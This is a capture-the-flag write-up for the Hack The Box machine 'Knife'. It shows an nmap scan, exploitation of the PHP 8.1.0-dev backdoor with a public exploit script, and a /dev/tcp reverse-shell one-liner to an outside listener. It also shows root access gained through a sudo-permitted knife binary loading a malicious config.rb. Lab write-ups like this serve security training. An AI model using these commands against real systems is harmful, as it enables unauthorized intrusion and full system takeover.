# Knife (Easy - Linux)

## Recon
### Nmap
```console
# nmap -Pn --open -sC -sV -p- 10.10.10.242
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-05 22:49 EST
Nmap scan report for 10.10.10.242
Host is up (0.016s latency).
Not shown: 58950 closed ports, 6583 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Initial Access
### PHP 8.1.0 Dev RCE
```console
# curl -i http://10.10.10.242/
HTTP/1.1 200 OK
Date: Thu, 06 Jan 2022 03:56:06 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8
```

Public exploit: [PHP 8.1.-dev Backdoor Remote Command Injection](https://packetstormsecurity.com/files/162749/PHP-8.1.0-dev-Backdoor-Remote-Command-Injection.html)

RCE:
```console
# python3 exploit.py -u http://10.10.10.242 -c id
[+] Results:
uid=1000(james) gid=1000(james) groups=1000(james)
```

Reverse Shell:
```console
# python3 exploit.py -u http://10.10.10.242 -c "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.4/9001 0>&1'"

# nc -lvnp 9001 
listening on [any] 9001 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.242] 57154
bash: cannot set terminal process group (858): Inappropriate ioctl for device
bash: no job control in this shell
james@knife:/$
```

### user.txt
```console
james@knife:~$ ls -la
ls -la
total 40
drwxr-xr-x 5 james james 4096 May 18  2021 .
drwxr-xr-x 3 root  root  4096 May  6  2021 ..
lrwxrwxrwx 1 james james    9 May 10  2021 .bash_history -> /dev/null
-rw-r--r-- 1 james james  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 james james 3771 Feb 25  2020 .bashrc
drwx------ 2 james james 4096 May  6  2021 .cache
drwxrwxr-x 3 james james 4096 May  6  2021 .local
-rw-r--r-- 1 james james  807 Feb 25  2020 .profile
-rw-rw-r-- 1 james james   66 May  7  2021 .selected_editor
drwx------ 2 james james 4096 May 18  2021 .ssh
-r-------- 1 james james   33 Jan  6 03:52 user.txt
james@knife:~$ cat user.txt
cat user.txt
93a2__REDACTED__c56a
```

## Privesc
```console
james@knife:~$ sudo -l
sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

`knife` binary's `-c` (config) function could read a file to load/use the configuration file.
```console
james@knife:~$ echo 'exec "/bin/bash -i"' > config.rb
echo 'exec "/bin/bash -i"' > config.rb
james@knife:~$ cat config.rb
cat config.rb
exec "/bin/bash -i"
james@knife:~$ sudo /usr/bin/knife user list -c config.rb
sudo /usr/bin/knife user list -c config.rb
bash: cannot set terminal process group (858): Inappropriate ioctl for device
bash: no job control in this shell
root@knife:/home/james# id
id
uid=0(root) gid=0(root) groups=0(root)
```

### root.txt
```console
root@knife:/home/james# cat /root/root.txt
cat /root/root.txt
6357__REDACTED__c4e19
```


